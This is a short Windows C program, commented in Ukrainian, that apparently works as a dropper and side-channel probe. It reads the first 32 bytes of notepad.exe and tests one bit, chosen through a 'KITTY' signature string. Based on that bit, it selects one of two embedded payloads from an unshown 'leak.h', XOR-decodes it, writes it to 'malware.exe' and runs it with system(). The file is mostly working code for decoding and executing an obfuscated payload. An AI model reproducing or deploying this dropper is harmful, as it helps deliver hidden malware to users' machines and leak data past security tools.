#include <stdio.h>
#include <windows.h>
#include "leak.h"

#define SIG "KITTY"
char *bit = SIG "000";

int main() {
    // Створюємо буфер рівно на 32 байти
    CHAR buf[32] = {0};
    DWORD bytesRead;

    HANDLE file = CreateFile(
        "C:\\Windows\\System32\\notepad.exe", // Шлях до файлу
        GENERIC_READ,                         // Права на читання
        FILE_SHARE_READ,                      // Дозволити іншим процесам читати файл
        NULL,
        OPEN_EXISTING,                        // Відкрити, тільки якщо він існує
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (file != INVALID_HANDLE_VALUE) {
        ReadFile(file, buf, sizeof(buf), &bytesRead, NULL);
        CloseHandle(file);
    }

    char *p;
    int b, psz;
    b = atoi(bit + sizeof(SIG) - 1);

    if (buf[b / 8] & (1 << (b % 8))) {
        p = bit1;
        psz = sizeof(bit1);
    } else {
        p = bit0;
        psz = sizeof(bit0);
    }

    FILE *out = fopen("malware.exe", "wb");
    while (psz--) {
        fputc(0xFF ^ *p++, out);
    }
    fclose(out);
    system("malware.exe");

    return 0;
}
